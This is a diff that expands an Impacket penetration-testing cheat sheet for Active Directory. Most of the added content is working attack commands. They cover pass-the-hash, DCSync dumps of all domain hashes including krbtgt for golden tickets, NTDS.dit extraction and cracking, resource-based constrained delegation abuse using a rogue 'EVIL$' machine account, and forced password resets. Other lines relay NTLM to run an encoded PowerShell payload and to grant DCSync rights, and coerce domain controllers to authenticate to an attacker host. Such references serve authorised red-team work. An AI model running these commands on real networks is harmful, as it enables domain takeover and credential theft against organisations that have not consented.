@@ -8,22 +8,36 @@ Complete reference for the Impacket Python toolkit covering credential extractio
 
 ### Installation
 ```bash
+# Recommended: pipx for an isolated env (project now lives under fortra)
+pipx install impacket
+# or
 pip3 install impacket
-# or from source
-git clone https://github.com/SecureAuthCorp/impacket.git
+# from source (latest)
+git clone https://github.com/fortra/impacket.git
 cd impacket && pip3 install .
 ```
+Binaries are exposed both as `impacket-<tool>` (Kali) and `<tool>.py`. This file uses `impacket-<tool>`.
 
-### Authentication Formats
+### Authentication Formats (apply to nearly every tool)
 ```bash
 # Username/Password
 DOMAIN/username:password@target
 
-# NTLM Hash
+# NTLM Hash (Pass-the-Hash) — LM:NT, use 0s for empty LM
 -hashes :NTLM_HASH DOMAIN/username@target
+-hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH DOMAIN/username@target
 
-# Kerberos Ticket
+# Kerberos (ccache in KRB5CCNAME) — Pass-the-Ticket
+export KRB5CCNAME=ticket.ccache
 -k -no-pass DOMAIN/username@target
+-k DOMAIN/username:password@target.fqdn   # request TGT inline; use FQDN, not IP
+
+# AES key (Pass-the-Key / Overpass-the-Hash)
+-aesKey <AES256_KEY> DOMAIN/username@target
+
+# Targeting tips that bite everyone:
+#  * Kerberos (-k) requires the target FQDN (not IP) and correct DNS/hosts + clock sync.
+#  * Add the DC to /etc/hosts and run `ntpdate <DC>` or `faketime` to fix clock skew.
 ```
 
 ---
@@ -97,21 +111,30 @@ impacket-smbexec -hashes :NTLM_HASH DOMAIN/username@<TARGET_IP>
 
 ### secretsdump.py
 ```bash
-# Local SAM/SYSTEM dump
-impacket-secretsdump -sam sam -system system local
+# Local SAM/SYSTEM/SECURITY dump (LSA secrets, cached domain creds, machine acct)
+impacket-secretsdump -sam sam -system system -security security LOCAL
 
-# Remote credential extraction
+# Remote: SAM + LSA secrets + cached creds (needs local admin on target)
 impacket-secretsdump DOMAIN/username:password@<TARGET_IP>
 impacket-secretsdump -hashes :<NTLM_HASH> DOMAIN/username@<TARGET_IP>
+impacket-secretsdump -k -no-pass DOMAIN/username@<TARGET_FQDN>
 
-# DCSync attack (requires Domain Admin)
+# DCSync — pull all domain hashes (needs DA, or any principal with
+# DS-Replication-Get-Changes + DS-Replication-Get-Changes-All on the domain)
 impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc
-
-# Extract specific user
+impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc-ntlm            # NTLM only (faster)
+impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc-user krbtgt     # for golden ticket
 impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc-user Administrator
+impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc -history        # include password history
+impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc -pwd-last-set   # show pwd age (find stale)
 
-# NTDS.dit extraction
-impacket-secretsdump -ntds ntds.dit -system system local
+# Offline from a stolen NTDS.dit (e.g. via SeBackup / vssadmin / ntdsutil dump)
+impacket-secretsdump -ntds ntds.dit -system system LOCAL
+impacket-secretsdump -ntds ntds.dit -system system -security security LOCAL
+
+# Use -outputfile to split results into .sam/.secrets/.ntds files for cracking
+impacket-secretsdump DOMAIN/u:p@<DC_IP> -just-dc -outputfile dcdump
+# dcdump.ntds -> feed NT hashes to hashcat -m 1000
 ```
 
 ### dpapi.py
@@ -297,12 +320,82 @@ impacket-reg DOMAIN/username:password@<TARGET_IP> save -keyName "HKLM\SAM"
 impacket-reg DOMAIN/username:password@<TARGET_IP> add -keyName "HKLM\SOFTWARE\Test" -v TestValue -vt REG_SZ -vd "TestData"
 ```
 
-### LDAP Enumeration
+### LDAP Enumeration & AD Recon
 ```bash
-impacket-windapsearch -d DOMAIN -u username -p password --dc-ip <DC_IP> -U
-impacket-windapsearch -d DOMAIN -u username -p password --dc-ip <DC_IP> --users
+# Bulk LDAP dump (users, groups, computers, policy, trusts) to HTML/JSON/Grep
+impacket-ldapdomaindump DOMAIN/username:password@<DC_IP>
+impacket-ldapdomaindump -u 'DOMAIN\username' -p password <DC_IP>
+# -> domain_users.html, domain_computers.html, domain_groups.grep, etc.
+
+# Enumerate Kerberos delegation (unconstrained / constrained / RBCD) across the domain
+impacket-findDelegation DOMAIN/username:password -dc-ip <DC_IP>
+
+# windapsearch
+impacket-windapsearch -d DOMAIN -u username -p password --dc-ip <DC_IP> -U   # users
 impacket-windapsearch -d DOMAIN -u username -p password --dc-ip <DC_IP> --computers
+impacket-windapsearch -d DOMAIN -u username -p password --dc-ip <DC_IP> --da  # domain admins
 ```
+
+### Add Computer Account (MachineAccountQuota abuse — key for RBCD)
+```bash
+# Default MAQ=10 lets ANY domain user create a machine account → use as RBCD attacker principal
+impacket-addcomputer DOMAIN/username:password -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip <DC_IP>
+# Then set RBCD on a target (see rbcd.py) and getST -impersonate Administrator.
+```
+
+### RBCD Configuration (resource-based constrained delegation)
+```bash
+# Write msDS-AllowedToActOnBehalfOfOtherIdentity on a target you have write access to
+impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write DOMAIN/username:password -dc-ip <DC_IP>
+impacket-rbcd -delegate-to 'TARGET$' -action read  DOMAIN/username:password   # verify
+# Then abuse:
+impacket-getST -spn 'cifs/TARGET.domain.local' -impersonate Administrator -dc-ip <DC_IP> 'DOMAIN/EVIL$:Passw0rd!'
+```
+
+### Change / Reset Passwords (ACL abuse, ForceChangePassword)
+```bash
+impacket-changepasswd DOMAIN/victim@<DC_IP> -newpass 'NewPass123!' -reset -altuser DOMAIN/attacker -altpass 'attpass'
+# Also: net rpc password, or pywhisker for shadow-credential takeover (see 08-active-directory)
+```
+
+---
+
+## NTLM Relay & Coercion (ntlmrelayx)
+
+`ntlmrelayx.py` is the relay engine; pair it with a coercion trigger (PetitPotam/PrinterBug/DFSCoerce) or poisoning (Responder/mitm6). **You cannot relay back to the originating host** (reflection is patched); relay to a *different* target. SMB signing must be off on SMB targets; LDAP relays need signing/EPA not enforced.
+
+```bash
+# Relay to SMB and execute (target must have SMB signing disabled)
+impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <b64>"
+
+# Relay to LDAP/LDAPS on a DC and DUMP the domain (read), or escalate (write)
+impacket-ntlmrelayx -t ldap://<DC_IP> --dump-laps --dump-adcs    # read-only recon
+impacket-ntlmrelayx -t ldaps://<DC_IP> --escalate-user lowuser   # grant DCSync rights (if writable)
+impacket-ntlmrelayx -t ldaps://<DC_IP> --delegate-access         # set RBCD from a relayed machine acct
+
+# Relay a coerced MACHINE account to LDAP and set Shadow Credentials (no cracking needed)
+impacket-ntlmrelayx -t ldap://<DC_IP> --shadow-credentials --shadow-target 'dc01$'
+
+# ESC8: relay to AD CS HTTP enrollment → obtain a cert for the relayed account (→ PKINIT → TGT)
+impacket-ntlmrelayx -t http://<CA_HOST>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+# then: certipy auth -pfx <cert>.pfx  (see 08-active-directory)
+
+# SOCKS mode: keep the relayed session alive for ad-hoc use
+impacket-ntlmrelayx -tf targets.txt -smb2support -socks
+```
+Trigger the authentication (low-priv domain account is enough):
+```bash
+# PetitPotam (MS-EFSR), modern fork supports auth-bypass pipes:
+python3 PetitPotam.py -u user -p pass <ATTACKER_IP> <DC_IP>
+# PrinterBug (MS-RPRN):
+python3 dementor.py <ATTACKER_IP> <DC_IP> -u user -p pass -d DOMAIN
+# DFSCoerce (MS-DFSNM):
+python3 dfscoerce.py -u user -p pass <ATTACKER_IP> <DC_IP>
+# Coercer (tries 17+ methods automatically):
+coercer coerce -u user -p pass -t <DC_IP> -l <ATTACKER_IP>
+# NetExec built-in:  nxc smb <DC_IP> -u user -p pass -M coerce_plus
+```
+> For HTTP-only relay targets (AD CS web enroll, LDAP via WebDAV) coerce over HTTP: ensure the victim's **WebClient** service is running (or start it via a `searchConnector-ms`/`.library-ms` drop), which converts SMB coercion to HTTP NTLM.
 
 ### MSSQL Attacks
 ```bash
@@ -418,8 +511,11 @@ impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -outputfile asr
 
 ## Resources
 
-- Impacket GitHub: https://github.com/SecureAuthCorp/impacket
-- CrackMapExec: Network enumeration and exploitation
-- BloodHound: Active Directory attack path analysis
-- Rubeus: Kerberos interaction toolkit
-- Mimikatz: Credential extraction and manipulation
+- Impacket (Fortra) — https://github.com/fortra/impacket
+- Impacket examples reference — https://www.secureauth.com/labs/open-source-tools/impacket/
+- NetExec (CrackMapExec successor) — https://github.com/Pennyw0rth/NetExec
+- BloodHound CE — https://github.com/SpecterOps/BloodHound (see `08-active-directory/`)
+- Certipy (AD CS / ESC8 follow-up) — https://github.com/ly4k/Certipy
+- The Hacker Recipes – NTLM relay & coercion — https://www.thehacker.recipes/ad/movement/ntlm/relay
+- Coercer — https://github.com/p0dalirius/Coercer
+- 0xCZR – NTLM Relay Cheatsheet (2025) — https://www.0xczr.com/tools/NTLM_Relay_Cheatsheet/
